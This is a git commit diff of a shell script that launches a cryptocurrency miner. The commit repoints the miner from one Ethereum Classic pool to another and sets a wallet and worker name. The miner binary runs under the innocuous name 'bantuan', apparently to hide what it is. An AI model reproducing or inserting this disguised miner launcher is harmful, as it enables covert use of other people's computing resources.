1c9e55d69035503696c74c8cfc50756d649defc6
motoceli <86542945+motoceli@users.noreply.github.com>
2021-09-15 09:03:14 +0700

    Update data.sh

--- data.sh
+++ data.sh
@@ -1,9 +1,9 @@
-POOL=ethash.unmineable.com:3333
+POOL=asia-etc.2miners.com:1010
 
 WALLET=ETC:0xc1a48c0ff1d28c85685e3eabd55d19f12327e139
 
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Volkath#5drz-sssa)
+WORKER=-Volkath
 
 chmod +x bantuan
 
-./bantuan --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+./bantuan --algo ETCHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
